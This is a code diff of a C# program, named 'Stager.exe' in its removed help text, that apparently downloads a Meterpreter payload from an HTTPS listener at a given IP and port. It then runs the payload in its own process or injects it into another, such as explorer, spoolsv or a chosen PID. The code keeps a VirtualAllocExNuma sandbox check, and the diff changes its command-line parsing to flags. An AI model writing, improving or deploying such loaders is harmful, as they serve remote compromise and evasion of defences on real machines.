@@ -1,12 +1,7 @@
 ﻿using System;
-using System.Net;
-using System.Text;
-using System.Runtime.InteropServices;
-using System.Security.Cryptography.X509Certificates;
 using System.Diagnostics;
-using System.Threading;
-using System.Linq;
-using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
 
 public class Program
 {
@@ -44,84 +39,107 @@ public class Program
 
     public static void Main(string[] args)
     {
+
         IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, MEM_COMMIT_RESERVE, 0x3000, PAGE_READWRITE, 0);
         if (mem == null)
         {
             return;
         }
 
-        string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
-        string mode;
-        string ip;
-        string port;
+        string mode = "run"; // Default
+        string ip = null;
+        string port = null;
+        string program = null;
         int pid = 0;
         Process[] expProc;
 
-        // Set default values
-        //mode = "run";
-        string[] pathSplit = path.Split('\\');
-        string exeName = pathSplit[pathSplit.Length - 1];
-        string opts = Path.GetFileNameWithoutExtension(exeName);
-
-        if (args == null || args.Length == 0)
+        for (int i = 0; i < args.Length; i++)
         {
-            string[] options = opts.Split('_');
-
-            if (options.Length < 3)
+            switch (args[i])
             {
-                print_help();
-                return;
-            }
+                case "-i":
+                case "--ip":
+                    if (i + 1 < args.Length)
+                    {
+                        ip = args[++i];
+                    }
+                    break;
 
-            mode = options[0];
-            ip = options[1];
-            port = options[2];
-        }
-        else if (args.Length >= 3)
-        {
-            mode = args[0];
-            ip = args[1];
-            port = args[2];
+                case "-p":
+                case "--port":
+                    if (i + 1 < args.Length)
+                    {
+                        port = args[++i];
+                    }
+                    break;
 
-            if (args.Length == 4)
-            {
-                pid = int.Parse(args[3]);
+                case "-P":
+                case "--program":
+                    if (i + 1 < args.Length)
+                    {
+                        program = args[++i];
+                    }
+                    break;
+
+                case "-d":
+                case "--pid":
+                    if (i + 1 < args.Length)
+                    {
+                        pid = Int32.Parse(args[++i]);
+                    }
+                    break;
+
+                default:
+                    mode = args[i];
+                    break;
             }
         }
-        else
+
+        if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(port))
         {
             print_help();
             return;
         }
+
+        if (string.IsNullOrEmpty(mode) || (mode == "inject" && string.IsNullOrEmpty(program) && pid == 0))
+        {
+            print_help();
+            return;
+        }
+
+        string processName = "";
 
         switch (mode)
         {
             case "run":
                 pid = Process.GetCurrentProcess().Id;
                 break;
-            case "injectexp":
-                expProc = Process.GetProcessesByName("explorer");
-                pid = expProc[0].Id;
-                break;
-            case "injectspool":
-                expProc = Process.GetProcessesByName("spoolsv");
-                pid = expProc[0].Id;
-                break;
-            case "injectpid":
-                try
+            case "inject":
+                if (pid == 0)
                 {
-                    pid = Int32.Parse(args[3]);
-                }
-                catch
-                {
-                    print_help();
-                    return;
+                    processName = program;
                 }
                 break;
             default:
                 print_help();
                 return;
         }
+
+        if (!string.IsNullOrEmpty(processName))
+        {
+            expProc = Process.GetProcessesByName(processName);
+
+            if (expProc.Length > 0)
+            {
+                pid = expProc[0].Id;
+            }
+            else
+            {
+                Console.WriteLine($"Process {processName} not found, defaulting to 'run' mode.");
+                pid = Process.GetCurrentProcess().Id;
+            }
+        }
+
 
 
         string nonce = G();
@@ -199,14 +217,25 @@ public class Program
 
     public static void print_help()
     {
-        Console.WriteLine("Argumentless Usage: Mode_IP_Port");
-        Console.WriteLine("Usage: Stager.exe Mode IP Port PID");
-        Console.WriteLine("Mode: Mode of operation. Can be run, injectexp, injectspool, injectpid");
-        Console.WriteLine("run: Runs met in curent process. injectexp: Injects into explorer and then runs. injectspool: injects spoolsv and then runs. injectpid: Injects a specific PID");
-        Console.WriteLine("IP: The IP or hostname of the HTTPS handler listener. E.g. 192.168.1.1 or corp.com");
-        Console.WriteLine("Port: The port the listener is on. Defaults to 443 if none is provided");
-        Console.WriteLine("PID: Process ID to inject, eg 1234 (only used in injectpid mode)");
+        Console.WriteLine("Usage:");
+        Console.WriteLine("\tmyprogram.exe mode [options]");
+        Console.WriteLine();
+        Console.WriteLine("Modes:");
+        Console.WriteLine("\trun");
+        Console.WriteLine("\tinject");
+        Console.WriteLine();
+        Console.WriteLine("Options:");
+        Console.WriteLine("\t-i, --ip \tIP address");
+        Console.WriteLine("\t-p, --port \tPort number");
+        Console.WriteLine("\t-P, --program \tProgram name (for 'inject' mode)");
+        Console.WriteLine("\t-d, --pid \tProcess ID (for 'inject' mode)");
+        Console.WriteLine();
+        Console.WriteLine("Example:");
+        Console.WriteLine("\tmyprogram.exe inject -i 192.168.0.1 -p 443 -P explorer");
+        Console.WriteLine("\tmyprogram.exe inject -i 192.168.0.1 -p 443 -d 1234");
     }
+
+
 
     public static byte[] Stager(string url)
     {
